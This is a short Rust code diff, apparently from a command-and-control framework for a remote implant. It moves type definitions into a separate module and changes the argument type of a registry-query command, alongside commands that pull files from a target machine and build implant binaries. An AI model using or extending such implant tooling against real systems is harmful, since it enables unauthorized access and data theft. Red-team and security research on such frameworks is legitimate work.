@@ -6,6 +6,8 @@ use std::{
     path::PathBuf,
 };
 
+use crate::task_types::{BuildAllBins, FileCopyInner, RegQueryInner};
+
 /// Commands supported by the implant and C2.
 ///
 /// To convert an integer `u32` to a [`Command`], use [`Command::from_u32`].
@@ -171,16 +173,6 @@ impl Display for Command {
     }
 }
 
-/// The inner type for the [`AdminCommand::Copy`] and [`AdminCommand::Move`], represented as an tuple with
-/// the format (from, to).
-pub type FileCopyInner = (String, String);
-
-/// Represents inner data for the [`AdminCommand::BuildAllBins`], as a tuple for:
-/// (`profile_disk_name`, `save path`, `listener_profile`, `implant_profile`).
-///
-/// For `listener_profile` & `implant_profile`, a value of `None` will resolve to matching on `default`.
-pub type BuildAllBins = (String, String, Option<String>, Option<String>);
-
 #[derive(Serialize, Deserialize, Clone)]
 pub enum AdminCommand {
     Sleep(i64),
@@ -207,7 +199,7 @@ pub enum AdminCommand {
     /// Pulls a file from the target machine, downloading to the C2
     Pull(String),
     BuildAllBins(BuildAllBins),
-    RegQuery(String),
+    RegQuery(RegQueryInner),
     Undefined,
 }
 
